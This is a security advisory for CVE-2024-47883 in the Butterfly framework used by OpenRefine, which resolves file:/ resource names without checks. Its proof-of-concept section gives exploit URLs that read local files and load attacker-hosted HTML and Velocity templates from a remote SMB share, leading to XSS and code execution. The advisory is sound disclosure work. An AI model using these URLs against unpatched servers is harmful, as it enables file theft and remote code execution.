# Butterfly has path/URL confusion in resource handling leading to multiple weaknesses

**GHSA**: GHSA-3p8v-w8mr-m3x8 | **CVE**: CVE-2024-47883 | **Severity**: critical (CVSS 9.1)

**CWE**: CWE-22, CWE-36, CWE-918

**Affected Packages**:
- **org.openrefine.dependencies:butterfly** (maven): < 1.2.6

## Description

### Summary

The Butterfly framework uses the `java.net.URL` class to refer to (what are expected to be) local resource files, like images or templates. This works: "opening a connection" to these URLs opens the local file. However, if a `file:/` URL is directly given where a relative path (resource name) is expected, this is also accepted in some code paths; the app then fetches the file, from a remote machine if indicated, and uses it as if it was a trusted part of the app's codebase.

This leads to multiple weaknesses and potential weaknesses:

* An attacker that has network access to the application could use it to gain access to files, either on the the server's filesystem (path traversal) or shared by nearby machines (server-side request forgery with e.g. SMB).
* An attacker that can lead or redirect a user to a crafted URL belonging to the app could cause arbitrary attacker-controlled JavaScript to be loaded in the victim's browser (cross-site scripting).
* If an app is written in such a way that an attacker can influence the resource name used for a template, that attacker could cause the app to fetch and execute an attacker-controlled template (remote code execution).

### Details

The `edu.mit.simile.butterfly.ButterflyModuleImpl.getResource` method converts a resource name into an URL, for instance:

```
images/logo-gem-126.svg
file:/C:/Users/Wander/IdeaProjects/OpenRefine/main/webapp/modules/core/images/logo-gem-126.svg
```

If the resource name already starts with `file:/`, it is passed through unmodified (line 287). There is no check that the resulting URL is inside the expected directory or on the same machine.

The default implementation for `process` in `ButterflyModuleImpl` is to serve a named resource, which makes it vulnerable. The Velocity template library is bound to the same `getResource` implementation through the `ButterflyResourceLoader` class, which means it is also vulnerable if template resource names can somehow be influenced by an attacker.

### PoC

This demonstration has been tested with [OpenRefine](https://github.com/OpenRefine/OpenRefine) on a Windows machine. Start OpenRefine, create a file (here `example.js`) with some contents, then concatenate the OpenRefine URL and its `file:/` URL, as follows:

    http://localhost:3333/file:/C:/Users/Wander/example.js

The file is read and sent to the browser. Then, visit:

    http://localhost:3333/file:%2f%2fwandernauta.nl/public/demo.html

Assuming there are no firewalls in the way, the HTML page is retrieved from the public SMB (Samba) network share and sent to the browser, which executes the embedded JavaScript.

In the case of OpenRefine specifically, to demonstrate the attacker-controlled template name case:

    http://localhost:3333/file:%2f%2fwandernauta.nl/public/index

An `index.vt` template containing the snippet above is retrieved from the same share, which is then executed; the Windows calculator opens.

### Impact

Depending on how the framework is used: path traversal, XSS, SSRF; potentially RCE.
